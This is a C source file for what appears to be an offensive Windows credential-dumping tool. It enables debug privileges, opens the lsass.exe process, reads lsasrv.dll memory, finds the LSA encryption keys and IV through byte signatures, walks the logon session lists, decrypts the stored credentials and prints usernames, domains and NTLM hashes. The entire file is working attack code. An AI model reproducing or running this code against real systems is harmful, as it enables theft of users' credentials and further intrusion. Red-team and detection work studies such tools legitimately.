
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <subauth.h>

#pragma comment(lib, "bcrypt.lib")


#define LSA_PATTERN "\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15"
#define MSV_PATTERN "\x33\xff\x41\x89\x37\x4c\x8b\xf3\x45\x85\xc0\x74"

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

	PVOID memmem(PVOID haystack, SIZE_T haystack_len, PVOID needle, SIZE_T needle_len)
	{
		if (haystack == NULL) return NULL; // or assert(haystack != NULL);
		if (haystack_len == 0) return NULL;
		if (needle == NULL)	return NULL; // or assert(needle != NULL);
		if (needle_len == 0) return NULL;

		DWORDLONG offset = 0;
		for (PCHAR h = (PCHAR)haystack; haystack_len >= needle_len; ++h, --haystack_len, ++offset) 
		{
			if (!memcmp(h, needle, needle_len))
				return (PCHAR)h;
		}
		return NULL;
	}

	VOID EnableDebugPriv()
	{
		HANDLE				hToken		= NULL;
		LUID				luid		= { 0 };
		TOKEN_PRIVILEGES	TokenPrivs	= { 0 };

		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

		TokenPrivs.PrivilegeCount			= 1;
		TokenPrivs.Privileges[0].Luid		= luid;
		TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(hToken, false, &TokenPrivs, sizeof(TokenPrivs), NULL, NULL);

		CloseHandle(hToken);
	}

	HANDLE LsassHandle()
	{
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

		if (Process32First(snapshot, &entry) == TRUE)
			while (Process32Next(snapshot, &entry) == TRUE)
			{
				char processName[1024];
				size_t convertedCharsCount;

				wcstombs_s(&convertedCharsCount, processName, entry.szExeFile, 1024);

				if (_stricmp(processName, "lsass.exe") == 0) {
					CloseHandle(snapshot);
					printf("[*] Found Lsass: %d\n", entry.th32ProcessID);
					return OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, entry.th32ProcessID );
				}
			}

		CloseHandle(snapshot);
		return 0;
	}

PVOID GetModuleBase(HANDLE hProcess, PCHAR ModuleName, PDWORD MdlBaseSize)
{
	
	HMODULE*	ModuleArray	= NULL;
	HMODULE		Module		= NULL;
	DWORD		ModuleNum	= 0;
	DWORD		ModuleSize	= 0;
	PVOID		ModuleBase	= NULL;

	if (EnumProcessModules(hProcess, ModuleArray, 0, &ModuleSize) == 0)
	{
		printf("[!] EnumProcessModules failed: %d\n", GetLastError());
		return NULL;
	}

	ModuleNum = ModuleSize / sizeof(HMODULE);
	printf("[+] Lsass: Modules[%d]\n", ModuleSize / sizeof(HMODULE));

	ModuleArray = (HMODULE*)LocalAlloc(LPTR, ModuleSize);

	if (EnumProcessModules(hProcess, ModuleArray, ModuleSize, &ModuleSize) == 0)
	{
		printf("[!] EnumProcessModules failed: %d\n", GetLastError());
		return NULL;
	}

	for (int i = 0; i < ModuleNum; i++) 
	{
		CHAR	Name[MAX_PATH] = { 0 };

		if (!GetModuleFileNameExA(hProcess, ModuleArray[i], Name, MAX_PATH)) {
			printf("[!] GetModuleFileNameExA failed: %d\n", GetLastError());
			return NULL;
		}

		// check if the module is lsasrv.dll
		if (strstr(Name, ModuleName) != NULL)
		{
			MODULEINFO modinfo;

			if (!GetModuleInformation(hProcess, ModuleArray[i], &modinfo, sizeof(modinfo)))
			{
				printf("[!] GetModuleInformation failed: %d\n", GetLastError());
				return NULL;
			}
			
			memset(ModuleArray, 0, ModuleSize);
			LocalFree(ModuleArray);

			*MdlBaseSize = modinfo.SizeOfImage;
			return modinfo.lpBaseOfDll;
		}
	}
}

void hexprint(void* b, int len)
{
	printf("[ ");
	for (int i = 0; i < len; ++i) {
		printf("0x%02hhx ", *(PUCHAR)((DWORDLONG)b + i));
	}
	puts("]");
}

int main()
{
	HANDLE		hLsass			= NULL;
	PVOID		LsaBaseAddr		= NULL;
	DWORD		LsaSize			= 0;
	PVOID		LsaMemory		= NULL;
	UCHAR		LsaPattern[]	= LSA_PATTERN;
	SIZE_T		BytesRead		= 0;
	PVOID		LsaPat			= NULL;

	PVOID		LsaIvOffset		= (PVOID)67;
	PVOID		LsaViOffset		= NULL;
	
	PVOID		DesKeyOffset	= NULL;
	PVOID		DesKeySizeAddr	= 0; 
	PVOID		DesKeyDataAddr	= 0; 
	UINT32		DesKeyLength	= 0;

	PVOID		KBHKOffset		= NULL;
	PVOID		KBHKDesBuffer	= NULL;
	PVOID		KBHKAesBuffer	= NULL;

	PVOID		AesKeyOffset	= NULL;
	PVOID		AesKeyDataAddr	= NULL;
	PVOID		AesKeySizeAddr	= NULL;
	UINT32		AesKeyLength	= NULL;

	BYTE		MsvPattern[]	= MSV_PATTERN;
	PVOID		MsvPat			= NULL; 

	PVOID		LogonCountOff	= NULL;
	INT 		LogonCount		= NULL;
	PVOID		LogonFirstOff	= NULL;

	PVOID		LogonEntryPtr	= NULL;
	PVOID		LogonPosition	= NULL;
	PVOID		LogonBuffer		= NULL;
	PVOID		LogonTmpVal		= NULL;

	puts("[*] Lsass Parser by Paul Ungur ( @C5pider )");

	EnableDebugPriv(); 
	puts("[+] Enabled debug privs");

	hLsass = LsassHandle();
	if (!hLsass)
	{
		printf("[-] Failed to open lsass: %x\n", GetLastError());
		return 1;
	}

	printf("[+] Handle to lsass: %x\n", hLsass);

	// Get lsasrv base addr
	LsaBaseAddr = GetModuleBase(hLsass, (PCHAR)"lsasrv.dll", &LsaSize);
	if (!LsaBaseAddr)
	{
		puts("[-] Failed to get lsasrv.dll base addr\n");
		return 1;
	}
	printf("[*] Lsasrv.dll base addr: %x\n", LsaBaseAddr);

	LsaMemory = LocalAlloc(LPTR, LsaSize);

	if (!ReadProcessMemory(hLsass, LsaBaseAddr, LsaMemory, LsaSize, &BytesRead))
	{
		printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
			return 1;
	}

	LsaSize = BytesRead;
	LsaPat  = memmem(LsaMemory, LsaSize, LsaPattern, 16);
	printf("[*] Lsa Pattern pointer: %x : ", LsaPat);
	hexprint(LsaPat, 16);


	// IV
	LsaViOffset = (PVOID) ((DWORDLONG)LsaPat + 67);
	LsaViOffset = (PVOID) ((DWORDLONG)LsaViOffset + 4 + *(UINT32*)LsaViOffset);
	printf("[+] Lsa IV Offset: %x : ", LsaViOffset);
	hexprint(LsaViOffset, 16);

	// Des Key Offset 
	DesKeyOffset = (PCHAR)((DWORDLONG)LsaPat + (DWORDLONG)-89);
	DesKeyOffset = (PCHAR)((DWORDLONG)DesKeyOffset + 4 + *(UINT32*)DesKeyOffset);
	printf("[+] Des Key Offset: %x : ", DesKeyOffset);
	hexprint(DesKeyOffset, 8);

	// KBHK struct addr
	KBHKOffset		= (PVOID) *(UINT64*)DesKeyOffset;
	BytesRead		= 0x200;
	KBHKDesBuffer	= LocalAlloc(LPTR, BytesRead);
	memset(KBHKDesBuffer, 0, BytesRead); 

	if ( ! ReadProcessMemory( hLsass, KBHKOffset, KBHKDesBuffer, BytesRead, &BytesRead ) )
	{
		printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
		return 1; 
	}

	// Des Key Data & Size
	DesKeySizeAddr = (PVOID)((PCHAR)KBHKDesBuffer + 88);
	DesKeyDataAddr = (PVOID)((PCHAR)DesKeySizeAddr + 4);
	DesKeyLength   = *(UINT32*)DesKeySizeAddr;
	printf("[*] Des Key [%d]: ", DesKeyLength); hexprint(DesKeyDataAddr, DesKeyLength);

	// Aes Key
	AesKeyOffset = (PCHAR)((DWORDLONG)LsaPat + 16);
	AesKeyOffset = (PCHAR)((DWORDLONG)AesKeyOffset + 4 + *(UINT32*)AesKeyOffset);
	printf("[+] Aes Key Offset: %x : ", AesKeyOffset);
	hexprint(AesKeyOffset, 8);

	KBHKOffset		= (PVOID)*(UINT64*)AesKeyOffset;
	BytesRead		= 0x200;
	KBHKAesBuffer	= LocalAlloc(LPTR, BytesRead);
	memset(KBHKAesBuffer, 0, BytesRead);

	if (!ReadProcessMemory(hLsass, KBHKOffset, KBHKAesBuffer, BytesRead, &BytesRead))
	{
		printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
		return 1;
	}

	AesKeySizeAddr = (PVOID)((PCHAR)KBHKAesBuffer + 88);
	AesKeyDataAddr = (PVOID)((PCHAR)AesKeySizeAddr + 4);

	AesKeyLength = *(UINT32*)AesKeySizeAddr;
	printf("[+] AES key [%d]: ", AesKeyLength);
	hexprint(AesKeyDataAddr, (int)AesKeyLength);

	// ==== Now we parse our Logon Sessions ====
	printf("\n==== Parse Logon Sessions ====\n");
	MsvPat = memmem(LsaMemory, LsaSize, MsvPattern, 12);
	printf("[*] Msv Pattern [%d]: ", 12); hexprint(MsvPat, 12);

	// Parse logon session count
	LogonCountOff = (PCHAR)((DWORDLONG)MsvPat + (DWORDLONG)-4);
	LogonCountOff = (PCHAR)((DWORDLONG)LogonCountOff + 4 + *(UINT32*)LogonCountOff);
	LogonCount	  = *(UINT8*)LogonCountOff;
	printf("[+] Logon Count Offset: %x : ", LogonCountOff); hexprint(LogonCountOff, 1); 
	printf("[+] Current Logon Sessions: %d\n", LogonCount);

	// Parse first logon session
	LogonFirstOff = (PCHAR)((DWORDLONG)MsvPat + (DWORDLONG)23);
	LogonFirstOff = (PCHAR)((DWORDLONG)LogonFirstOff + 4 + *(UINT32*)LogonFirstOff);
	printf("[+] Logon First Offset: %x\n", LogonFirstOff);

	// Iterate over Sessions
	LogonEntryPtr = (PVOID)*(UINT64*)LogonFirstOff;
	
	puts("");

	for (INT i = 0; i < LogonCount; i++)
	{
		PVOID Location		= NULL;
		PVOID LocationFirst = NULL;
		INT	  Limit			= 255;
		INT   Iterations	= 0; 

		UNICODE_STRING LogonUserData	= { 0 };
		UNICODE_STRING LogonDomainData	= { 0 };
		UNICODE_STRING EncryptedData	= { 0 };

		PVOID	CredFirst	= NULL; 
		PVOID	CredList	= NULL; 
		PVOID	CredEntry	= NULL;
		PVOID	CredFList	= NULL; 

		PVOID	PriCredList		= NULL; 
		PVOID	PriCredFirst	= NULL; 
		PVOID	PriCredBuffer	= NULL;

		PVOID	EntryFirst		= NULL;
		PVOID	Flink			= NULL;
		PVOID	Value			= NULL;

		LogonPosition	= LogonFirstOff;
		Location		= LogonPosition;
		LocationFirst	= LogonPosition; 
		EntryFirst		= (PVOID)*(UINT64*)Location;

		Value = (PVOID)*(UINT64*)Location;

		// check if Location is pointing to itself. if it does then it is empty.so lets just skip it
		if (Location == EntryFirst)
			continue;

		// Itereate over logon session linked list
		while (TRUE)
		{
			// printf("\n  [+] Looking at entry %d in the logonsession's linked list\n", Iterations);
			Iterations++;

			// Linked list shouldn't have more than 255 entries
			if (Iterations >= Limit)
			{
				printf("[-] Linked list should have more than 255 entries\n");
				return 1;
			}

			if (Value == 0)
			{
				printf("[-] No more data in the linked list\n");
				break;
			}

			LogonPosition	= Value;
			LogonBuffer		= LocalAlloc(LPTR, 0x800);
			memset(LogonBuffer, 0, 0x800);

			if ( ! ReadProcessMemory( hLsass, LogonPosition, LogonBuffer, 0x800, &BytesRead ) )
			{
				printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
				return 1;
			}
			
			Flink		= (PVOID)DEREF_64(LogonBuffer);
			LogonBuffer = (PWSTR)((DWORDLONG)LogonBuffer + 144);

			// User name
			LogonUserData.Length = *(UINT_PTR*)LogonBuffer;
			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 2);

			LogonUserData.MaximumLength = *(UINT64*)LogonBuffer;
			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 2);

			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 4);
			LogonTmpVal = (PWSTR)*(UINT_PTR*)LogonBuffer;			
			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 8);

			BytesRead			 = LogonUserData.Length;
			LogonUserData.Buffer = (PWSTR)LocalAlloc(LPTR, BytesRead + 2);

			if (!ReadProcessMemory(hLsass, LogonTmpVal, LogonUserData.Buffer, BytesRead, &BytesRead))
			{
				printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
				return 1;
			}

			// Domain name
			LogonDomainData.Length = *(UINT_PTR*)LogonBuffer;
			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 2);

			LogonDomainData.MaximumLength = *(UINT64*)LogonBuffer;
			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 2);

			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 4);
			LogonTmpVal = (PWSTR) * (UINT_PTR*)LogonBuffer;

			BytesRead = LogonDomainData.Length;
			LogonDomainData.Buffer = (PWSTR)LocalAlloc(LPTR, BytesRead + 2);

			if (!ReadProcessMemory(hLsass, LogonTmpVal, LogonDomainData.Buffer, BytesRead, &BytesRead))
			{
				printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
				return 1;
			}

			// Iterate over Creds list
			LogonBuffer = (PVOID)((DWORDLONG)LogonBuffer + 96);
			CredFirst = (PVOID)*(UINT_PTR*)LogonBuffer; 
			if (CredFirst)
			{
				CredList = CredFirst; 

				do
				{
					BytesRead = 0x200;
					CredEntry = LocalAlloc(LPTR, BytesRead);

					if (!ReadProcessMemory(hLsass, CredList, CredEntry, BytesRead, &BytesRead))
					{
						printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
						return 1;
					}

					CredFList = (PVOID) *(UINT_PTR*)CredEntry;

					CredEntry = (PVOID)((DWORDLONG)CredEntry + 8); 

					CredEntry = (PVOID)((DWORDLONG)CredEntry + 4); 
					CredEntry = (PVOID)((DWORDLONG)CredEntry + 4);

					PriCredFirst = (PVOID)*(UINT_PTR*)CredEntry;
					CredEntry	 = (PVOID)((DWORDLONG)CredEntry + 8);
					PriCredList	 = PriCredFirst;

					do 
					{
						BytesRead		= 0x2000;
						PriCredBuffer	= LocalAlloc(LPTR, BytesRead);

						if (!ReadProcessMemory(hLsass, PriCredList, PriCredBuffer, BytesRead, &BytesRead))
						{
							printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
							return 1;
						}

						PVOID PriEntryFlist = (PVOID)DEREF_64(PriCredBuffer);

						PriCredBuffer		= (PVOID)((DWORDLONG)PriCredBuffer + 8);
						UINT8 PriLength		= DEREF_8(PriCredBuffer);

						PriCredBuffer		= (PVOID)((DWORDLONG)PriCredBuffer + 2);
						UINT8 PriMaxLength	= DEREF_8(PriCredBuffer);

						PriCredBuffer		= (PVOID)((DWORDLONG)PriCredBuffer + 2);
						PriCredBuffer		= (PVOID)((DWORDLONG)PriCredBuffer + 8);

						// Get Encrypted Data 
						PriCredBuffer			= (PVOID)((UINT_PTR)PriCredBuffer + 4);
						EncryptedData.Length	= *(UINT16*)PriCredBuffer;

						PriCredBuffer			= (PVOID)((UINT_PTR)PriCredBuffer + 2);
						EncryptedData.MaximumLength = DEREF_16(PriCredBuffer);

						PriCredBuffer			= (PVOID)((UINT_PTR)PriCredBuffer + 2);
						PriCredBuffer			= (PVOID)((UINT_PTR)PriCredBuffer + 4);

						if (EncryptedData.Length > 0)
						{
							// Ptr to Encrytped Creds
							LogonTmpVal = (PWSTR)DEREF_64(PriCredBuffer);
							EncryptedData.Buffer = (PWSTR)LocalAlloc(LPTR, EncryptedData.Length + 2);

							if (!ReadProcessMemory(hLsass, LogonTmpVal, EncryptedData.Buffer, EncryptedData.Length, &BytesRead))
							{
								printf("[-] ReadProcessMemory: Failed [%d]\n", GetLastError());
								return 1;
							}

							// Decrypt Encrytped Creds
							BCRYPT_ALG_HANDLE	hCrypt		= NULL;
							BCRYPT_KEY_HANDLE	hKey		= NULL;
							PVOID				KeyTxt		= NULL;
							UCHAR				TempIV[16]	= { 0 };
							NTSTATUS			NtStatus	= STATUS_SUCCESS;

							KeyTxt = LocalAlloc(LPTR, EncryptedData.Length);

							memcpy(TempIV, LsaViOffset,16);

							NtStatus = BCryptOpenAlgorithmProvider(&hCrypt, BCRYPT_3DES_ALGORITHM, NULL, 0);
							NtStatus = BCryptSetProperty(hCrypt, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
							NtStatus = BCryptGenerateSymmetricKey(hCrypt, &hKey, NULL, 0, (PUCHAR)DesKeyDataAddr, DesKeyLength, 0);
							NtStatus = BCryptDecrypt(hKey, (PUCHAR)EncryptedData.Buffer, EncryptedData.Length, 0, (PUCHAR)TempIV, 8, (PUCHAR)KeyTxt, EncryptedData.Length, (PULONG)&NtStatus, 0);

							if (NtStatus != 0) {
								printf("      [!] 3DES decrypt failed: %d\n", NtStatus);
								return 1;
							}

							void* ntlm = (void*)((DWORDLONG)KeyTxt + 74);

							printf("\tLogon ID : %d\n", Iterations);
							printf("\tUsername : %ls\n", LogonUserData.Buffer);
							printf("\tDomain   : %ls\n", LogonDomainData.Buffer);
							printf("\tNTLM     : "); for (int j = 0; j < 16; ++j) { printf("%02hhx", *(UCHAR*)((DWORDLONG)ntlm + j)); }
							puts("");
							puts("");

						}
						else 
						{
							printf("[-] Encrypted Data Length: %d\n", EncryptedData.Length);
						}

						PriCredList = PriEntryFlist;
						
					} while ((PriCredList != PriCredFirst) && (PriCredList != 0));

					puts("[*] Finished logon session list");

					CredEntry = CredFList;

				} while ((CredEntry != CredFirst) && (CredEntry!= 0));
				printf("  [+] No more Credential List entries to iterate over\n");
			}
			else
			{
				printf("\tLogon ID : %d\n", Iterations);
				printf("\tUsername : %ls\n", LogonUserData.Buffer);
				printf("\tDomain   : %ls\n", LogonDomainData.Buffer);
				printf("\t(Failed to parse NTLM hash)\n");
				puts("\n");
			}

			if (EntryFirst == Flink) 
			{
				printf("[+] After %d iterations: We have iterated the entire linked list!\n", Iterations);
				printf("    The next entry is the one we started on. Breaking...\n");
				break;
			}

			Value = Flink;
			
			// Cleanup
			if (LogonUserData.Buffer)
			{
				memset(LogonUserData.Buffer, 0, LogonUserData.Length);
				LocalFree(LogonUserData.Buffer);
			}

			if (LogonDomainData.Buffer)
			{
				memset(LogonDomainData.Buffer, 0, LogonDomainData.Length);
				LocalFree(LogonDomainData.Buffer);
			}
		}
	}

Exit:
	// Exit
	CloseHandle(hLsass);
}